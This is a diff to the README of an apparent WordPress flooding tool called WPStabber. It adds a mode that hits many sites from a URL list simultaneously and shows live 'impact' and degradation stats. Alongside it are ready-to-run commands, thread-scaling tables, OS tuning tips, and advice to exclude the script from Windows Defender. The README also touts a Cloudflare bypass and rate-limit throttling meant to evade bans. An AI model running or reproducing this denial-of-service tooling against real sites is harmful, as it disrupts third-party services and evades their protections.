@@ -42,6 +42,7 @@
 
 - [Installation](#installation)
 - [Quick Start](#quick-start)
+- [Multi-Target Mode](#multi-target-mode)
 - [Attack Vectors](#attack-vectors)
 - [Auto-Probe](#auto-probe)
 
@@ -51,6 +52,7 @@
 - [Cloudflare Bypass](#cloudflare-bypass)
 - [Custom Search Terms](#custom-search-terms)
 - [Output Indicators](#output-indicators)
+- [Scaling for Multi-Target](#scaling-for-multi-target)
 
 ## Installation
 
@@ -88,6 +90,15 @@ python wpstabber_win.py -t "https://target.com" --no-cookies
 python3 wpstabber_linux.py -t "https://target.com" --no-cookies
 ```
 
+### Multi-Target Test
+```bash
+# Windows
+python wpstabber_win.py -L targets.txt --no-cookies
+
+# Linux
+python3 wpstabber_linux.py -L targets.txt --no-cookies
+```
+
 ### With Cloudflare (Static Cookie)
 ```bash
 python wpstabber_win.py -t "https://target.com" -c "cf_clearance=YOUR_COOKIE"
@@ -97,6 +108,82 @@ python wpstabber_win.py -t "https://target.com" -c "cf_clearance=YOUR_COOKIE"
 ```bash
 python wpstabber_win.py -t "https://target.com" --bypass
 ```
+
+## Multi-Target Mode
+
+Test multiple WordPress sites simultaneously from a single command using `-L` / `--targets-file`.
+
+### Targets File Format
+
+Create a text file with one URL per line. Blank lines and `#` comments are ignored. Bare domains are auto-prefixed with `https://`.
+
+```text
+# targets.txt - production sites
+https://site1.com
+https://site2.com/blog
+site3.com
+# site4.com  ← skipped (commented out)
+https://site5.com
+```
+
+### Usage
+```bash
+# Windows - basic multi-target
+python wpstabber_win.py -L targets.txt --no-cookies
+
+# Linux - multi-target with adaptive throttling
+python3 wpstabber_linux.py -L targets.txt --no-cookies -a
+
+# Windows - multi-target with more threads and 60s duration
+python wpstabber_win.py -L targets.txt --no-cookies -T 2000 -d 60
+
+# Linux - multi-target with more processes
+python3 wpstabber_linux.py -L targets.txt --no-cookies -p 32
+```
+
+### How It Works
+
+1. **Connectivity check** — verifies all targets are reachable, with the option to skip failures
+2. **Per-target probing** — each site gets its own vector discovery
+3. **Per-target baselining** — independent baseline response times
+4. **Thread/process distribution** — workers are split evenly across targets
+5. **Simultaneous attack** — all targets are hit at once
+6. **Live dashboard** — one row per target with real-time stats and a combined total
+
+### Live Dashboard Output
+```
+Time  | Target              Reqs      RPS | Home       API       | Impact
+──────────────────────────────────────────────────────────────────────────────
+  12s | site1.com            4,521     376 |   0.45s(200)   0.32s(200) | STRESSED +78%
+  12s | site2.com/blog       3,892     324 |   1.23s(200)   0.98s(200) | 🔥 SEVERE +312%
+  12s | site3.com            4,103     341 |   0.12s(200)   0.09s(200) | HOLDING +15%
+      TOTAL                 12,516   1,041
+```
+
+### Final Report
+
+After stopping (Ctrl+C or `--duration`), a per-target breakdown is printed:
+
+```
+  PER-TARGET BREAKDOWN
+
+[1] https://site1.com
+    Threads:     267
+    Requests:    22,431
+    Avg RPS:     374
+    Baseline:    0.253s
+    Peak:        1.892s
+    Degradation: +648%
+
+[2] https://site2.com/blog
+    ...
+```
+
+### Notes
+
+- `-t` (single target) and `-L` (multi-target) are mutually exclusive
+- Cookies set via `-c`, `--bypass`, or `--no-cookies` are shared across all targets
+- Adaptive throttling (`-a`) works independently per target — if one site rate-limits you, only that site's threads back off
 
 ## Auto-Probe
 
@@ -120,6 +207,8 @@ Before attacking, WPStabber automatically probes all WordPress endpoints to dete
 ```
 
 Only **available** vectors are used during the attack. Blocked endpoints (403/404) are automatically skipped.
+
+In multi-target mode, each target is probed independently — vectors available on one site won't affect another.
 
 ## Attack Vectors
 
@@ -165,11 +254,13 @@ Only **available** vectors are used during the attack. Blocked endpoints (403/40
 | Feature | Description |
 |---------|-------------|
 | **Auto-Probe** | Detects available endpoints before attack |
+| **Multi-Target** | Test multiple sites simultaneously from a file (`-L`) |
 | **15 Attack Vectors** | REST API, XML-RPC, WP-Cron, Search, Cache purge |
 | **800 Concurrent Workers** | Maximum stress (configurable) |
 | **Cloudflare Bypass** | Live browser with auto cookie refresh |
 | **Weighted Vectors** | Heaviest endpoints hit more frequently |
 | **Real-time Monitoring** | Live RPS, response times, degradation |
+| **Per-Target Dashboard** | Independent stats per target in multi-target mode |
 | **Multilingual Search** | 2,430 terms in 11 languages |
 
 ## Search Analyzer
@@ -269,6 +360,8 @@ The throttle indicator shows current delay:
   48s   53,876   1,264 | 0.89s(200) 0.45s(200) | STRESSED +263%
 ```
 
+In multi-target mode, adaptive throttling is **independent per target** — one site getting rate-limited won't slow down attacks on other sites.
+
 ### Benefits
 - **Evades permanent bans** - backs off before triggering hard blocks
 - **Maximizes throughput** - ramps up as soon as rate limit lifts
@@ -294,18 +387,52 @@ The throttle indicator shows current delay:
 
 | Flag | Description | Default |
 |------|-------------|---------|
-| `-t, --target` | Target URL | Required |
+| `-t, --target` | Single target URL | — |
+| `-L, --targets-file` | File with target URLs (one per line) | — |
 | `-c, --cookies` | Cookie string | None |
 | `--bypass` | Live browser mode | Off |
 | `--no-cookies` | Run without cookies | Off |
-| `-T, --threads` | Thread count (Win) | 800 |
-| `-p, --processes` | Process count (Linux) | 16 |
+| `-T, --threads` | Thread count (Win) / threads per process (Linux) | 800 / 50 |
+| `-p, --processes` | Process count (Linux only) | 16 |
 | `-d, --duration` | Auto-stop seconds | 0 (manual) |
 | `--search-file` | Load terms from file | None |
-| `-a, --adaptive` | **Auto-throttle on rate limit** | Off |
+| `-a, --adaptive` | Auto-throttle on rate limit | Off |
+
+> **Note:** `-t` and `-L` are mutually exclusive. One of them is required.
+
+## Scaling for Multi-Target
+
+Workers are distributed evenly across targets. When testing many sites, scale up your total worker count to maintain per-target pressure.
+
+### Windows (`-T` total threads)
+
+| Targets | Recommended | Example |
+|---------|-------------|---------|
+| 1 | `-T 800` (default) | `wpstabber_win.py -t site.com -T 800` |
+| 3–4 | `-T 2000` to `-T 2500` | `wpstabber_win.py -L targets.txt -T 2000` |
+| 8+ | `-T 4000`+ | `wpstabber_win.py -L targets.txt -T 4000` |
+
+**Windows tips:**
+- Widen ephemeral port range in admin PowerShell: `netsh int ipv4 set dynamicport tcp start=1025 num=64000`
+- 4000 threads ≈ 4GB+ RAM from stacks alone
+- Windows Defender can silently tank throughput — consider excluding the script directory
+
+### Linux (`-p` processes × `-T` threads each)
+
+| Targets | Recommended | Example |
+|---------|-------------|---------|
+| 1–3 | `-p 16 -T 50` (default, 800 total) | `wpstabber_linux.py -t site.com` |
+| 4–8 | `-p 32 -T 50` (1,600 total) | `wpstabber_linux.py -L targets.txt -p 32` |
+| 10+ | `-p 48 -T 50`+ (2,400+ total) | `wpstabber_linux.py -L targets.txt -p 48` |
+
+**Linux tips:**
+- Raise file descriptor limit: `ulimit -n 65535`
+- Widen port range: `sysctl -w net.ipv4.ip_local_port_range="1024 65535"`
+- Linux handles high concurrency more cleanly than Windows — prefer it for 10+ targets
 
 ## Recommended Workflow
 
+### Single Target
 ```bash
 # 1. Find heavy search terms
 python search_analyzer.py -t "https://test.com" --auto -o heavy.txt
@@ -321,14 +448,29 @@ python wpstabber_win.py -t "https://test.com" --no-cookies --search-file heavy.t
 # 5. Compare degradation metrics, deploy to production
 ```
 
+### Multi-Target
+```bash
+# 1. Create target list
+echo -e "https://site1.com\nhttps://site2.com\nhttps://site3.com" > targets.txt
+
+# 2. Test all sites simultaneously for 120 seconds
+python wpstabber_win.py -L targets.txt --no-cookies -T 2400 -a -d 120
+
+# 3. Review per-target breakdown in final report
+# 4. Apply hardening to weakest sites, retest
+```
+
 ## Troubleshooting
 
 | Issue | Solution |
 |-------|----------|
 | **403 Blocked** | Use `--bypass` or fresh `cf_clearance` cookie |
 | **Low RPS** | Increase `-T 1000`, check bandwidth |
-| **Memory Issues** | Reduce `-p 8` and `-T 25` |
+| **Memory Issues** | Reduce `-p 8` and `-T 25` (Linux) or `-T 400` (Windows) |
 | **Browser won't open** | `pip install selenium webdriver-manager` |
+| **Port exhaustion (Windows)** | Run `netsh int ipv4 set dynamicport tcp start=1025 num=64000` as admin |
+| **Too many open files (Linux)** | Run `ulimit -n 65535` before launching |
+| **Multi-target low per-site RPS** | Scale up total workers: `-T 2000`+ (Win) or `-p 32`+ (Linux) |
 
 ## Legal
 
